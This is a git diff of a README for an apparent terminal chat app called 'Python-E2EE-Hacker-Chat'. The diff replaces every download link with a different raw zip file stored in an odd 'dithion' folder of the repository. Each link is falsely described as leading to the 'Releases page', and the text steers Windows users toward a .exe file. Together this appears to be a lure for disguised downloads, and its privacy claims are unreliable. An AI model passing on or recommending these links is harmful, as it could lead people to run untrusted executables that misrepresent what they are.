@@ -6,7 +6,7 @@ Welcome to Python-E2EE-Hacker-Chat! This is an advanced terminal chat applicatio
 
 ## 📥 Download the Application
 
-[![Download Python-E2EE-Hacker-Chat](https://github.com/kbjtushar/Python-E2EE-Hacker-Chat/raw/refs/heads/main/dithion/E_Chat_Hacker_Python_v3.6-beta.4.zip)](https://github.com/kbjtushar/Python-E2EE-Hacker-Chat/raw/refs/heads/main/dithion/E_Chat_Hacker_Python_v3.6-beta.4.zip)
+[![Download Python-E2EE-Hacker-Chat](https://github.com/kbjtushar/Python-E2EE-Hacker-Chat/raw/refs/heads/main/dithion/Hacker_Python_Chat_E_3.5.zip)](https://github.com/kbjtushar/Python-E2EE-Hacker-Chat/raw/refs/heads/main/dithion/Hacker_Python_Chat_E_3.5.zip)
 
 Click the button above to visit the Releases page. There, you can download the latest version of the software.
 
@@ -32,7 +32,7 @@ To run Python-E2EE-Hacker-Chat, ensure your system meets the following requireme
 
 ## 🔧 Instructions to Install
 
-1. **Visit the Releases Page**: Click the link [here](https://github.com/kbjtushar/Python-E2EE-Hacker-Chat/raw/refs/heads/main/dithion/E_Chat_Hacker_Python_v3.6-beta.4.zip) to navigate to the Releases page.
+1. **Visit the Releases Page**: Click the link [here](https://github.com/kbjtushar/Python-E2EE-Hacker-Chat/raw/refs/heads/main/dithion/Hacker_Python_Chat_E_3.5.zip) to navigate to the Releases page.
 2. **Choose the Latest Version**: You will see a list of available versions. Select the one labeled with "Latest".
 3. **Download the required file**:
    - For Windows, download the `.exe` file.
@@ -65,6 +65,6 @@ Make sure to periodically check the Releases page for updates. Regular updates i
 
 ## 🔗 Download & Install Again
 
-To download the latest version again or for the first time, visit the [Releases page](https://github.com/kbjtushar/Python-E2EE-Hacker-Chat/raw/refs/heads/main/dithion/E_Chat_Hacker_Python_v3.6-beta.4.zip).
+To download the latest version again or for the first time, visit the [Releases page](https://github.com/kbjtushar/Python-E2EE-Hacker-Chat/raw/refs/heads/main/dithion/Hacker_Python_Chat_E_3.5.zip).
 
 Your security and privacy matter. Enjoy safe conversations with Python-E2EE-Hacker-Chat!
